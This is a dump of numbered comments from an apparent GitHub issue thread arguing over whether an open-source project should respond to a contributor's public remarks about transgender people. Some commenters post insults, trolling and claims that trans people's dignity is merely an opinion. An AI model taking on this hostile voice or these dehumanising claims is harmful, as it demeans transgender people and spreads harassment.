So according to what you write, you would charge these people legally (so far possible, so far the law is on your side, so far you can prove it) and then continue happily working with them cause it's only ""about the project"".

Yes, sure.

What makes for you guys so easy to be objective and focused in the project is that nobody is attacking you as a person, or things that matter to you. You would not be able to keep this cool otherwise.
"
4757	"Questioning my right to exist with human dignity is not a ""differing opinion"", sorry.
"
4758	"@z44lx You would call the police. 
"
4759	"You can’t possibly think that “stop being offended; you’re not supposed to be offended” is going to _work_, right? How many times has something like this played out where that _did_ work? How many conferences that “didn’t need a code of conduct” played out with everyone saying “actually, yeah, meritocracy totally works?” This isn’t a particularly new or interesting approach, and every time I’ve seen it play out the public sentiment for that project becomes “it’s a shame they were so shitty; it could have been a decent project.”

People are flooding into an issue thread to tell you that the way your maintainer(s) are acting is reflecting poorly on your project, and you’re going with “nuh-uh because people shouldn’t feel that way?” You _must_ be smarter than that. I don’t particularly care what you do from here, but good luck riding this bomb into the ground.
"
4760	"I am deeply hurt and offended by the amount of hate and arrogance expressed in this thread.

Some outrageous accusations have been spun here based on no more than a few careless words in a medium that, by the way, makes any thoughtful interaction impossible by design - twitter. Soon, nobody even remembers or cares how it started, the snowball effect sets in.

Your misplaced anger genuinely scares me. Where can I hide from it? I already do not use social media, should I quit GitHub as well?

Please stop. Let us work on code here, and take the angry lynch mob back to wherever it is angry lynch mobs hang out nowadays. And remember, **angry lynch mobs come in all shapes and colors**, but, at the end of the day, an angry lynch mob is an angry lynch mob.

For what it's worth now that you do not perceive me as one of your own (_the other_, lynch mobs call it), @elia is one of the gentlest and kind people I had the pleasure of working with on ""the internets"".
"
4761	"> Haha yes, of course you can act cool and be able to ""keep things separate"", because it doesn't affect you.

It's called being coolheaded.

> What if the child molester would have molested your own children? What if the racist you have to work with would have beat your mother because he/she doesn't like her skin color? Or do this continuously? Or maybe something else that is very bad but difficult to prove?
> 
> So according to what you write, you would charge these people legally (so far possible, so far the law is on your side, so far you can prove it) and then continue happily working with them cause it's only ""about the project"".

Yes, exactly, that doesn't mean I would like that person, but it also doesn't mean it would affect the interactions on the project.

> Yes, sure.
> 
> What makes for you guys so easy to be objective and focused in the project is that nobody is attacking you as a person, or things that matter to you. You would not be able to keep this cool otherwise.

I always ""keep my cool"", there's no reason not to.
"
4762	"> Questioning my right to exist with human dignity is not a ""differing opinion"", sorry.

It is a ""differing opinion"", you think you have the right to exist with human dignity, he does not.
"
4763	"@vais we're an angry lynch mob now. cool. way to compare _a bunch of queers who are upset about the way you handled an issue_ to _the systematic and brutal public murder of black people_. keep it classy, kid.
"
4764	"@meh holy fucking shit, and you think that is a defensible opinion? you scare me. I hope you don't vote.
"
4765	"@erisdev Language again. Oh right, you dismissed my early comment as irrelevant. Carry on.
"
4766	"@erisdev You pretty much are an angry lynch mob. Someone shouted ""Witch! Witch!"" and you follow.

Do anyone pressing the ""charges"" here know the person in question at all?
"
4767	"^
"
4768	"> I always ""keep my cool"", there's no reason not to.

Yes, your ""always"" is a privileged ""always"". Anyone else probably would be able able to ""keep cool"" in that situation. You probably never have experienced anything near to the examples I provided, otherwise you would not be talking like that.

And anyway, given the improbable case that you are actually that cool and can work with somebody who beats your mother, I doubt this is the case for the majority of people.
"
4769	"> @meh holy fucking shit, and you think that is a defensible opinion? you scare me. I hope you don't vote.

You shouldn't come to conclusions without enough data.
"
4770	"What the hell is wrong with keeping code and politics separate? Does everything have to be politically correct? 
"
4771	"> Please stop. Let us work on code here, and take the angry lynch mob back to wherever it is angry lynch mobs hang out nowadays. And remember, angry lynch mobs come in all shapes and colors, but, at the end of the day, an angry lynch mob is an angry lynch mob.

Did anyone call for this person's death? Torture? Loss of employment? Suffering? I don't think anyone in this thread has called for @elia to experience so much as a hangnail.

Your hyperbole is sad and reflects a life lived in a protective bubble. Sharing it hurts your community.

> For what it's worth now that you do not perceive me as one of your own (the other, lynch mobs call it), @elia is one of the gentlest and kind people I had the pleasure of working with on ""the internets"".

There is nothing gentle about questioning the humanity of an entire class of people publicly. Nothing at all.
"
4772	"> Yes, your ""always"" is a privileged ""always"". Anyone else probably would be able able to ""keep cool"" in that situation. You probably never have experienced anything near to the examples I provided, otherwise you would not be talking like that.

As I said, you don't know anything about who or what I am, or what I have gone through, and you never will, because it's not relevant.

> And anyway, given the improbable case that you are actually that cool and can work with somebody who beats your mother, I doubt this is the case for the majority of people.

And that is their problem, what is illegal is illegal, and should be reported, doesn't mean it has to affect their work.
"
4773	"https://twitter.com/search?q=https%3A%2F%2Fgithub.com%2Fopal%2Fopal%2Fissues%2F941&src=typd

You have a lot of ‘level-headed and rational’ debating to do, @meh. You’re gonna be busy.
"
4774	"""It is a ""differing opinion"", you think you have the right to exist with human dignity, he does not.""

Yeah, there is a right to human dignity. 

(Universal Declaration of Human Rights)[http://www.un.org/en/documents/udhr/]
"
4775	"@Wilto Thanks for this great example of lynching.
"
4776	"> ""It is a ""differing opinion"", you think you have the right to exist with human dignity, he does not.""
> Yeah, there is a right to human dignity.
> (Universal Declaration of Human Rights)[http://www.un.org/en/documents/udhr/]

Who is right and who is wrong doesn't make those things not opinions.
"
4777	"@jebrosmund I don’t understand; just go talk them out of it?
"
4778	"> You have a lot of ‘level-headed and rational’ debating to do, @meh. You’re gonna be busy.

I will try to respond to everyone.
"
4779	"@meh: Mm-hm, I’m sure you can debate your way out of this. You’ve done a great job so far in this thread.
"
4780	"@Wilto Isn't it other people who should be making the appeal to him? It's his codebase. If you wanted a contributor removed, this _isn't_ the way to go about it.
"
4781	"@jedstraw oh yes, using ""fuck"" as an intensifier to express my overwhelming sense of frustration is morally equivalent to literally claiming that a class of people are delusional.

@meh I'm not sure what conclusion you think I should be coming to, but so far I've seen y'all defending this guy's bigotry as ""just an opinion"" (as if we didn't already know it's an _opinion_) as if that somehow makes it above criticism. just bear in mind that people use their opinions to determine future actions.
"
4782	"Then what _is_ the way to go about getting a contributor removed? Can you point me to the code of conduct so I can see the formal process?
"
4783	"@erisdev You want respect, but aren't respectful.
"
4784	"> What the hell is wrong with keeping code and politics separate? Does everything have to be politically correct?

@ipsumx You must have a lot of privilege if you think of ""politics"" as something that _can_ be separated from everything. People's humanity is dismissed, and for you it's just some ""politics"" you don't care about.
"
4785	"@andrewmcwatters I want ""respect"" as in ""to be treated like a proper human being"" and you seem to want ""respect"" as in ""for me to defer to you as an authority""
"
4786	"@andrewmcwatters Now, I’m no expert on basic human interaction, but when a large and disconnected network of people are very upset with how a situation was handled it _may_ mean that the situation was handled poorly. Do you think that might be what people are upset about?
"
4787	"@myfreeweb Well. I really wouldn't give a shit if he was _literally Hitler_. There, Godwin's law. 

Why should it matter if your interactions with him are abstracted entirely through code? 
"
4788	"@erisdev Never said the two were equal. Simply pointing out that you are disrespecting people yourself. 
"
4789	"> Isn't it other people who should be making the appeal to him? It's his codebase. If you wanted a contributor removed, this isn't the way to go about it.

in reference to:

> Elia Schito is publicly calling trans people out for ""not accepting reality"" on Twitter. His Twitter profile mentions that he is a core contributor to opal. Is this what the other maintainers want to be reflected in the project? Will any transgender developers feel comfortable contributing?

yeah, you're right. Calmly asking a question of the maintainers in hopes that they would respond kindly was wildly inappropriate.

She didn't even _actually_ ask for Elia's removal from the project. She asked whether this was what the maintainers wanted to be associated to.

Also, the answer appears to be an emphatic 'Yes.' I am quite glad that I have no need to cross compile Ruby to JS, since this seems like an otherwise good option for how to do so, but one that I will never use and actively advocate against for the foreseeable future. Not (primarily) because of Elia's comment, but because of the flippant and disrespectful handling of an honest, respectfully phrased question and the rampant disregard for human rights expressed here.
"
4790	" @jedstraw idgaf about whatever word games you're trying to play with me
"
4791	"> And anyway, given the improbable case that you are actually that cool and can work with somebody who beats your mother, I doubt this is the case for the majority of people.
> And that is their problem, what is illegal is illegal, and should be reported, doesn't mean it has to affect their work.

Thanks for proving your argumentation is neither serious nor well intended. Of course nobody can prove that you would not be able to work with people that constantly violate your dignity, human rights, etc. or concerning this example beat your mother. You can say you would be able to nicely cooperate with them.

That's the good thing about being privileged, you can always say ""if I were in your position I would..."". And you can say what you want, and nobody is going to prove you wrong, because you will never be in that position.
"
4792	"@Wilto I'm also upset with how this network of people are attacking @meh. I hold the same opinion he seems to hold, which is keep code in codebases, and leave issues trackers to issues about code.
"
4793	"@erisdev 'idgaf' really portrays how professional you hold yourself in public.
"
4794	">  I'm also upset with how this network of people are attacking @meh. I hold the same opinion he seems to hold, which is keep code in codebases, and leave issues trackers to issues about code.

So if someone does need to be removed from a team, irrespective of the reason, where should that discussion go, in your mind?
"
4795	"> @meh I'm not sure what conclusion you think I should be coming to, but so far I've seen y'all defending this guy's bigotry as ""just an opinion"" (as if we didn't already know it's an opinion) as if that somehow makes it above criticism. just bear in mind that people use their opinions to determine future actions.

I've never said that, what I said is that this is not the place to discuss opinions and views that aren't related to Opal.

And that his opinions are irrelevant to the project, he did and does good work, and his views have never shown or affected his behavior when interacting on means used to interact about the project or while interacting about the project.
"
4796	"@andrewmcwatters: Now, have you considered that those people are _the same kind of angry_ with you and @meh, in terms of feeling “attacked?” I don’t care about “debating” you; I want you to just stop and think about how you’re feeling right now, and how other people in this thread _might_ feel a lot like that, and I am going to leave you to that. No need to reply.
"
4797	"@andrewmcwatters I never claimed to be a professional. that was your claim. professionalism shouldn't be a prerequisite for human dignity.
"
4798	"@Wilto word. :+1: 
"
4799	"@erisdev That begs the question, does collaboration on a software project demand moral congruity?
"
4800	"> Then what is the way to go about getting a contributor removed? Can you point me to the code of conduct so I can see the formal process?

The only way would be to kill him or make him unable to write code, since he could as easily fork and keep maintaining them and merging back from upstream, and in case his version was better, people would use that instead.

And either way, there is no reason to remove him because he has always been respectful when interacting with anyone about the project.
"
4801	"@Wilto That's a good point, but I also don't request that all my atheist friends be removed from projects because they bash religious individuals in their free time. It has nothing to do with code.
"
4802	"This is what lynching looks like
https://upload.wikimedia.org/--[remove_this]--wikipedia/en/7/78/ThomasShippAbramSmith.jpg

This is not.

https://twitter.com/search?q=https%3A%2F%2Fgithub.com%2Fopal%2Fopal%2Fissues%2F941&src=typd

If you cannot see the difference, probably speaking in public is not for you.
"
4803	"@ipsumx _raises_ the question. and you're going to have to be more specific about what ""moral congruity"" means in this context.
"
4804	"Just close this.
"
4805	"@erisdev In plain english: why would you cause inharmony when trying to make a statement about a public relations issue to people if you want others to encourage harmony in the open source community.
"
4806	":shipit:
"
4807	"@erisdev Sorry, I'll rephrase. Does everyone in an OSS project have to have the same set of opinions*, more or less?

*opinions taken to include points-of-view on different political and non-political moral issues.
"
4808	"> Why should it matter if your interactions with him are abstracted entirely through code?

Because I would not willingly contribute to Hitler's happiness, well-being, or efficacy. This seems obvious, why did you find it to be a question worth asking?
"
4809	"> there is no reason to remove him because he has always been respectful when interacting with anyone about the project.

Of course. Because many people _did not_ interact with him (and the project) _because_ they felt excluded by his public comments!
"
4810	"> Of course. Because many people did not interact with him (and the project) because they felt excluded by his public comments!

And that is entirely their problem, if they choose to do so, they're free to.

But that decision is entirely based on assumptions, and not what actually happened.
"
4811	"ERMERGERD TEH DRAMA
"
4812	"@luisrudge It is already closed, unless you were talking to your own browser.
"
4813	"> > You have a lot of ‘level-headed and rational’ debating to do, @meh. You’re gonna be busy.
> 
> I will try to respond to everyone.

Wow. I admire your dedication. I probably would have given up trying to respond to everyone a long time ago, and just posted a long blog post summarizing my view. Anyway, considering the huge number of people involved here this might take a while.

For the record, I support your position on this and agree with most of what you've said here so far. Know though that this drama is far more likely to attract the attention of those who disagree with you than with those who do, and, as with any internet debate, you're very unlikely to convince anyone to adopt your viewpoint on the matter.

Anyway, good luck with the mob. Hopefully all this drama will die down in a couple days and you can go back to writing code.
"
4814	"@Ajedi32 :+1: 
"
4815	"@ipsumx absolutely not, but holding opinions that are hostile to other members of the team is kind of a big damn no-no because it can and does lead to bad feelings and possibly conflict.

bad feelings of course might not sound like a lot to you but just knowing someone feels that way about you is absolutely draining and will affect a person's ability to, you know, do their job. good mental health is important.
"
4816	"@to-json I find the philosophical exercise enticing. 

Statistically speaking, by anonymously working with a lot people on OSS projects you would be collaborating with a wide variety of people having wildly differing opinions*. They would surely include molesters, neo-nazis, rapists and all sorts of scum. Are we to vet all of these people as to ensure harmony within the group, or just accept their _good_ code as is, morals notwithstanding?
"
4817	"Protip: you are bitching against the 2nd top contributor to the 3rd top contributor that is defending him and the 1st top contributor didn't even showed here. You can cry and huff and puff, it's useless. If you don't like it, fork it or stfu.
"
4818	"@juanplopes sorry. the right name is locking :) https://help.github.com/articles/locking-conversations/

So, just lock this.
"
4819	"@luisrudge It's far wiser to just let people vent.
"
4820	"@mrseth participate in the conversation or piss off, kid
"
4821	"> Know though that this drama is far more likely to attract the attention of those who disagree with you than with those who do, and, as with any internet debate, you're very unlikely to convince anyone to adopt your viewpoint on the matter.

It's okay, I'm not trying to convince anyone, everyone is free to hold their opinion.

> Anyway, good luck with the mob. Hopefully all this drama will die down in a couple days and you can go back to writing code.

Don't worry, I'm writing code as we speak :panda_face:
"
4822	"@erisdev You really want people to listen to you, but you speak to others that way? How crass.
"
4823	"@ipsumx Is the issue about vetting all contributors? Nope, it's about removing them from the team after their terrible behavior becomes publicly known.
"
4824	"> Statistically speaking, by anonymously working with a lot people on OSS projects you would be collaborating with a wide variety of people having wildly differing opinions*. They would surely include molesters, neo-nazis, rapists and all sorts of scum. Are we to vet all of these people as to ensure harmony within the group, or just accept their good code as is, morals notwithstanding?

This is a bit of a straw man. No one asked for vetting. However, if a contributor is shown, explicitly and relatively obviously, to be socially problematic, I do feel like that discussion merits more than:

> If you want him removed, start working on Opal and contributing as much as him to everything he did for Opal so we have a replacement that's more in orientation with your morals and views.
> 
> Protip: you won't because you can't.

The insult is superfluous (and unmerited, @CoralineAda is pretty good) and the dismissal is off-putting. 
"
4825	"@erisdev  U MAD BRAH??/
"
4826	"@erisdev You're being quite patronizing. 

I'm sorry if your feelings have been hurt, but it's not your [right to be offended](http://www.goodreads.com/quotes/739464-nobody-has-the-right-to-not-be-offended-that-right). 
"
4827	"> @mrseth participate in the conversation or piss off, kid

@erisdev That comment was so dismissive, as if age == knowledge and that one must earn a seat at the table.
"
4828	"It's astonishing that today, of all days, with the Charleston victims' bodies barely cold, with the Memphis shooting all over the news, people have the nerve to compare anything on the internet to a lynch mob.

No one's body is hanging from any goddamned tree. Don't trivialize years' worth of black people's deaths by elevating your hurt feelings at criticism to that level of importance.
"
4829	"Is there a point to all this?

I'm serious. The contributing team is not going to change over this, and noone is likely to change their opinions either.

I suppose people can try to be right on the internet, but don't think that's a very rewarding endeavour.
"
4830	"@andrewmcwatters try engaging with me on a deeper level than ""your language is unprofessional"". what does it accomplish?

@ipsumx I think you're the one being patronizing tbh. I'm not asking to NOT BE OFFENDED. I'm asking to NOT BE REGARDED AS SUBHUMAN.
"
4831	"All these tears from the perpetually offended  that don't want to put the effort to create the project they want and instead keep crying for others to adapt to their demands. qq moar.
"
4832	"@erisdev https://www.youtube.com/watch?v=j1hB71MjEuA
"
4833	"Due to the comments of @elia and @meh on this issue I will be actively recommending people to stay away from Opal. I hope that the suggestion for a Code of Conduct will be taken seriously and then _strictly adhered to_ if it is approved.

Then, perhaps, the maintainers of this can have learned that exclusionary behavior is not ok and that dealing with it by dismissing complaints is the opposite of useful. Then I'll be comfortable recommending Opal again.

For the record - I don't think @elia needs to be removed, but I think this is a good learning opportunity for them and the team.
"
4834	"@adambeynon In the other ticket, @CoralineAda linked a code of conduct, which I quite find matching. I also don't find anything in there forbidding @elia from stating his own opinions.
"
4835	"@jedstraw yeah, just keep poking and prodding at little details of how I've said it and maybe you won't have to actually argue against anything I've said. dude has not contributed anything to the conversation so far other than trying to rile people up and you're coming after me.
"
4836	"@erisdev I'm pretty sure that whoever we are, there will always be someone somewhere in the world that will always regard us as a subhuman.

What's exciting is that is _this_ arena, you can choose to ignore that fact and still work together as a team, producing excellent code. _And not ever talk to each other about anything unrelated!_ :D
"
4837	"@abritinthebay So what's your point then?
"
4838	"@erisdev I never said I support what elia said. In fact, I don't. For the record, I think elia's comments about transgender and transracial people were unnecessary and hurtful.
"
4839	"I talked with @elia when I saw this thread... I'm pretty convinced that he's not a terrible person. That said, the way this issue has been handled, particularly the tenor with which the issue was closed is... off-putting to say the least. In other words, as not terrible as @elia may or may not be, @meh has more than made up for it in their interactions here.
"
4840	"As a demi-romantic transsracial toaskerkin, all this drama is triggering me.
"
4841	"@ipsumx Exactly my point. The whole point of this issue is to hurt elia's professional life for stating his opinion & now it hurts this project too.
"
4842	"@mrseth and the trolls come piling in... What exactly do you feel like you're contributing to this conversation? Your hee-larious commentary? Well done.
"
4843	"While I disagree with comments of the nature mentioned in the original post of this issue thread, I also disagree with such comments being used as a means of preventing someone from contributing code to a project.

Code is code, and if it's bad code, I'd hope it wouldn't be merged to such a project. Having said that, good code is good code and if someone contributes good code that would otherwise improve a project, is there really an expectation to ignore such code?

Obviously there's an issue of representation if said person is associated with the team and the team ends up being represented negatively as a whole, but representing the team negatively is pretty stupid for the reason I've given above, as is representing a corporation negatively when a single employee makes hateful comments.
"
4844	"@shockkolate How is this obvious, corporations are regularly held responsible for comments by high-ranking officials/leads and for good reasons?
"
4845	"@shockkolate people are fired from corporations for this. Why shouldn't people be banned from community projects for this?
"
4846	"I'm out, got better things to waste my life on than arguing over my right to exist. thread unsubscribed, don't bother tagging me, bye.
"
4847	"While I find the views expressed by @elia repulsive, to all those walking away from the project due to @elia's beliefs, if you knew the beliefs of all the maintainers/contributors of all the software you use (OSS or otherwise) I'd gamble that you would be left with very little.

Surely the best way to tackle this is not to walk away, but stick with it and try to educate and explain to people in the community their views are offensive and ill-judged. This is by far more work, but I feel the best approach.
"
4848	"This is the thread where noone wins.
"
4849	"This conversation is a bunch of stupid bullshit anyways, @Valarissa 
I might as well play in the mud.
"
4850	"I think because the transracial issue is only now coming to the forefront, it might be wise to give @elia some understanding in that regard, as he, like many others, are not yet aware of how to speak about the situation. The conversation has beens started, and that is good. Can anyone recommend any transracial people on twitter that we can start following or bring into the conversation to help?
"
4851	"@alexhitchins beliefs != public comments && this issue is an attempt at educating and explaining.
"
4852	"> The whole point of this issue is to hurt elia's professional life for stating his opinion & now it hurts this project too.

Is it? Again, the opening post:

> Elia Schito is publicly calling trans people out for ""not accepting reality"" on Twitter. His Twitter profile mentions that he is a core contributor to opal. Is this what the other maintainers want to be reflected in the project? Will any transgender developers feel comfortable contributing?

So I see a statement of fact (preceded by a link), another statement of fact, and 2 honest questions, none of which call for harm to Elia, or even allege that there is something explicitly wrong with his behaviour. Where is the intent to harm?
"
4853	"The only thing that will come out of this is bad PR for Opal.
"
4854	"@jebrosmund FOSS don't need people. People need FOSS. The core contributors haven't changed, the project isn't hurt in any way.
"
4855	"> This is the thread where noone wins.

The idea that a thread can be 'won' is the root of many, many social problems in tech. These are real people discussing real experiences, and attempting to sum that to a victor is using the wrong algorithm to handle the data.
"
4856	"As an open source developper I strongly disagree that open source is not about moral and ethics.
Hey GNU licence was created to make people able to control the technology they use, it's all but moralless !

I don't work on web technology but if I have to in the future, I will do my best not to use Opal in my projects until the issue is solved in a satisfactory maneer (ie public apologies from @elia or his commit rights being reduced), and will ask my teammate to use others techs as much as possible and not to contribute.
"
4857	"> social problems in tech.
> That is bollocks. There are social issues and there are tech issues. But you don't even develop, what do you know about tech, @to-json? 
"
4858	"@to-json Right. I'm not implying that there will or can be a victor to this apparent circlejerk, I'm merely stating then when such a thing exists there will be only losers.
"
4859	"@alexhitchins ""This is by far more work, but I feel the best approach."" Yes, it is. It is a lot of work. It is a lot of time, emotional energy, and banging of heads against walls. It is exhausting. We, queer people, are expected to constantly be _politely asking_ for basic respect. It's _degrading_ and when you don't do it, you get blamed for the disrespect you get. When you do ask, no matter how polite, you're told it wasn't polite enough.
"
4860	"@vjl where's the use in his commits rights being reduced? Will that change what he thinks about people?
"
4861	"As a transfriend seeing this kind of attitude in the Ruby community is discouraging me from ever learning it. This is why people say the tech industry is unwelcoming to diversities: unless @elia is removed from the project, I cannot learn Ruby, and thus can't get a job in Ruby development.

I hope you will listen to the public opinion and do what you have to do.
"
4862	"@jdax 

> We, queer people, are expected to constantly be politely asking for basic respect. 

Speak for yourself. I am as rude as I want and I have never had sex with women.
"
4863	"> Surely the best way to tackle this is not to walk away, but stick with it and try to educate and explain to people in the community their views are offensive and ill-judged. This is by far more work, but I feel the best approach.

@alexhitchins  I get what you're saying. But the beginning of that process is for people to see that there are real consequences for bigotry in the open source community. That awareness spreads slowly, via incidents like these. Until people understand that their bigoted opinions will lead to informal social sanctions, what incentive is there for them to spend time learning and re-evaluating those opinions?
"
4864	"@lleaff so you want to blame elia for not finding a job?
"
4865	"@lleaff you should sue him!
"
4866	"@jdax Actually, in this case someone has ""politely"" asked for someone to be severed from a project for their beliefs.
"
4867	"> As a transfriend seeing this kind of attitude in the Ruby community is discouraging me from ever learning it...unless @elia is removed from the project, I cannot learn Ruby, and thus can't get a job in Ruby development.

I sincerely hope this is a troll. It has to be, right? 
"
4868	"@jdax And that's _oppression._
"
4869	"@andrewmcwatters Some beliefs don't deserve respect. Those beliefs undeserving are usually somewhere along the lines of ""this group of people aren't humans.""
"
4870	"@jdax Did he say that, word-for-word?
"
4871	"@jdax, That's not what I read in the tweet. That sounds like slander to me. You basically write off his beliefs _and_ result to slander. You are **literally a slanderous person** unless you can prove to me he said that.
"
4872	"@jdax Yes, cite that please?
"
4873	"@jdax Now you resorted to plain lying?
"
4874	"@to-json 

> She didn't even actually ask for Elia's removal from the project. She asked whether this was what the maintainers wanted to be associated to.

Read the issue title.
"
4875	"@to-json 

> She didn't even actually ask for Elia's removal from the project. She asked whether this was what the maintainers wanted to be associated to.

This is not what the issue name says.
"
4876	"@andrewmcwatters @mrseth @jedstraw  did I say he said that? Or did I give an example of opinions that aren't to be respected?
"
4877	"@jdax You clearly implied it
"
4878	"> That is bollocks. There are social issues and there are tech issues. But you don't even develop, what do you know about tech

Correction, I don't even do FOSS. I don't like dealing with the attitude that someone's intellect excuses their class B personality disorder and the inevitable accompanying disgusting behaviour. 

> Read the issue title.

Since we've all been super pedantic the whole thread, it's worth noting that the thread title is a statement of opinion more than a CTA. That said, I stand (kinda) corrected.
"
4879	"@jdax surely it couldn't be implied that you were paraphrasing him...
"
4880	"@jedstraw Well he clearly implied a lot of things himself.
"
4881	"@jdax 

> implying implied implications
"
4882	"@jdax You are a slanderous and disrespectful person.
"
4883	"> @shockkolate people are fired from corporations for this. Why shouldn't people be banned from community projects for this?

Because those are PR stunts, and the company would be affected negatively otherwise, this is not a company, it's a technology, we're not making any money off it, we're working on it in our free time, we're putting our time and effort into it because we care about the technology.

If @elia brought his views in the issue tracker, mailing list, IRC channel, etcetera, there would be a problem, but he did it on his personal Twitter.
"
4884	"@andrewmcwatters easy now with the ad-hominems.
"
4885	"@andrewmcwatters /shrug. I'm not the one saying I'd let child molesters on my team.
"
4886	"@to-json 

> Correction, I don't even do FOSS.

So you don't even collaborate to FOSS and just hangs around poking on stuff you don't know and doesn't concern you?
"
4887	"@jdax If you don't care about what you're doing here, please don't do it.
"
4888	"@jdax And you invalid other people's work, too.
"
4889	"Freedom of speech should be freedom for both sides. I support transgender people, but I don't support this kind of hatred. As in that quote

> I disapprove of what you say, but I will defend to the death your right to say it
"
4890	"Protip: all the ones mad are the ones who don't actually collaborate.
"
4891	"@e-oz :+1: 
"
4892	"This thread is so perfectly highlighting the toxic culture that drove me out of the Ruby community. Kudos to @meh for being willing to serve as such an extreme example of the issues we face in working with FOSS contributors.

As a trans\* software developer, I must fulfill my _moral_ obligation of warning everyone I know who expresses an interest in Opal: its contributors actively cultivate a hostile environment toward queer developers.
"
4893	"> So you don't even collaborate to FOSS and just hangs around poking on stuff you don't know and doesn't concern you?

It concerns me because in the beautiful hypothetical future where FOSS isn't overrun by sociopaths I'd rather enjoy it. Philosophically the act of writing FOSS resonates with me but the community is often rather abhorrent.
"
4894	"If it was me managing this, I would just prevent more comments on this issue.

@emilyrose Did you ever use contact ANY contributor of Opal? If not, you don't have the right to warn anyone of anything.
"
4895	"@to-json  So instead of building this community you would like to have, you just wait with arms crossing yelling that the people are the ones who should change?
"
4896	"@jebrosmund If @elia don't apologize then reducing his rights is a way for Opal to tell his views are his owns and aren't shared by the whole project.
""Reducing right"" can be removing all commit access of course.
"
4897	"@emilyrose

> As a trans\* software developer, I must fulfill my moral obligation of warning everyone I know who expresses an interest in Opal: its contributors actively cultivate a hostile environment toward queer developers.

Where did any other contributor that wasn't @elia state that?
"
4898	"Would like to remind people of the definition of Bigotry
""intolerance toward those who hold different opinions from oneself.""

The inability to work with someone whose views you disagree with is bigotry.  If @elia is unable to work with people who hold opposing views, then he'd be a bigot.  You're going to have to prove that.  Right now many of you are proving yourselves to be bigots.

Inability to talk to those you disagree with is the mark of an intolerant/ignorant mind.
"
4899	"@mrseth We're doing what must done for this to happen: making it socially unacceptable to have an opinion that discriminates people. 
"
4900	"> @to-json So instead of building this community you would like to have, you just wait with arms crossing yelling that the people are the ones who should change?

Nah, I've also been scratching my own itches, practicing, reading, writing throwaway projects, making local forks that never get merged, etc. Not that this is your business of course, but for transparency's sake.

Edit: Also, characterizing my participation as yelling is a master yogi stretch, yo.
"
4901	"@juanplopes no, you are toxic bigoted parasites.
"
4902	"Clearly you're not going to have a change of heart when you're on the defensive like this (I get the schtick, you're the ""super rational programmer"" who can dismiss all complaints with ""logic"", and when someone doubles down on that persona they don't tend to back down) so I'm not gonna even try to change your mind about the original issue, but I've gotta say:

Dude, you are burning a ton of bridges for yourself and Opal right now.  I'm sure you'll say you don't care about people not liking or using or contributing to your project, which, who knows, maybe is true—but do you really wanna be that guy who people don't want to work with because you're too much of a dick?  You know that being a good programmer and a good person aren't mutually exclusive, right?
"
4903	"@juanplopes I disagree that that is a wise move. It will not and cannot ever happen, since those people in question will be able to use anonymity to mask their identities.
"
4904	"@myfreeweb & @hnrysmth - I take on your points. I think this is one step towards educating people and sanctions are sometimes appropriate. Can't help but think you are more likely to influence change with continued education rather than removing someone. It could well be the case however that removing @elia would have a greater impact. Whatever happens, I hope he sees that the majority of people here find his views towards transgender people completely unacceptable either way.
"
4905	"> Dude, you are burning a ton of bridges for yourself and Opal right now.

Bridges that lead to where, exactly, @devdame
"
4906	"> @jebrosmund If @elia don't apologize then reducing his rights is a way for Opal to tell his views are his owns and aren't shared by the whole project.
> ""Reducing right"" can be removing all commit access of course.

That's a bad way to state that, and it's been stated in this issue, and in case the code of conduct pull request does come in, that will be another statement.
"
4907	"> Where did any other contributor that wasn't @elia state that?

Well, @meh... you closed the issue without discussion. you tweeted some really dismissive things. the official opal twitter account retweeted those tweets.

I don't need any more evidence.
"
4908	"@emilyrose I only see cats: https://twitter.com/opal
"
4909	"@juanplopes 

> @mrseth We're doing what must done for this to happen: making it socially unacceptable to have a opinion that discriminate people.

By discriminating those people?
"
4910	"By the way, Coraline is a really fantastic and seasoned developer and a genuinely kind person.  She works so hard here in Chicago to help make our field inclusive and get people excited about open source and programming in general.  There was absolutely no reason to respond to her like that right off the bat, even if you didn't agree.  Your beliefs are only part of why people are upset with you—the rest of it is that you're just being a jerk.
"
4911	"@mrseth I literally addressed that in the following sentence because I knew y'all would say that.  Scroll up! :)
"
4912	"@emilyrose

> Well, @meh... you closed the issue without discussion. you tweeted some really dismissive things. the official opal twitter account retweeted those tweets.

I closed the issue and explained why, I did not lock it, the discussion happened and is still happening.

The retweet was of the statement for the reason, this is a technology, what @elia says on his own Twitter or whatever is his opinion, and he has the right to state his opinion.

No contributor said ""yeah, @elia is totally right"" or ""no, @elia is totally wrong"", what has been stated by other contributors is that this is a technology, and what @elia says on his own Twitter or whatever is his opinion, and he has the right to state his opinion.

> I don't need any more evidence.

And you're free to have your opinion without any more evidence to the contrary.
"
4913	"Btw., Elia is such a fantastic and seasoned developer. He's #2 developer for a big open source project and has shown great dedication to his work. His skills in Ruby and other programming languages are almost unmatched and he never failed to respond to issues in said projects.
"
4914	"Again, bridges to where? Who wanna work with people that throw a tantrum because of stuff like this? SJWs are the one burning bridges, @devdame.
"
4915	"> By discriminating those people?

@meh If the State ensures freedom by enforcing laws, is that taking freedom away, or making sure everyone gets a fair share of it?
"
4916	"A cool aspect of this thread is pointing out a bunch of GH accounts I can follow belonging to people I'd be interested in collaborating with, as they evidence their concern for the human element alongside the technology. Every time this sort of thing happens, it yields a list of good people who are also developers, a list that is far harder to compile than a list of good developers. Yay, progress, even in a shitshow!
"
4917	"@to-json For me, it gives me a list of people to block.
"
4918	"> For me, it gives me a list of people to block.

Feel free (encouraged, even!) to start with me :100: 
"
4919	"@jebrosmund So long, and take @mrseth with you. :)
"
4920	"@devdame

> Dude, you are burning a ton of bridges for yourself and Opal right now. I'm sure you'll say you don't care about people not liking or using or contributing to your project, which, who knows, maybe is true—but do you really wanna be that guy who people don't want to work with because you're too much of a dick? You know that being a good programmer and a good person aren't mutually exclusive, right?

If they base their opinion on me being ""a dick"" and hard to work with based on what people who have never worked with me say, then yeah, I don't mind.

And you have no information to know if I'm a good person or not, and never will, because I don't mix things that are irrelevant to eachother.
"
4921	"@meh, Please stop responding, This issue is being linked all over the internet, several forums are targeting this project and raiding it right now.

I highly recommend going into damage control mode and just not replying to these posts. There isn't constructive discussion going on anymore, its people with hurt feelings going out for their way for revenge guised as justice. 
"
4922	"I can't believe this issue hasn't been locked yet. Between the endless circular arguments and sockpuppet troll accounts this has completely run it's course.
"
4923	"@meh I subscribe to your worldview. It should be possible to contribute to an OSS project _and_ be a real-life bona fide asshole at the same time ;) 
"
4924	"There's a lot of heated crap being posted in this thread.

@meh - would you at least agree that the statements made on that Twitter post are not representative of how the Opal project wishes to present itself to the world?

If that's true - acknowledging that would go _at least some way_ to moving forward (aside from the trolls in here).
"
4925	"Hey everybody, 
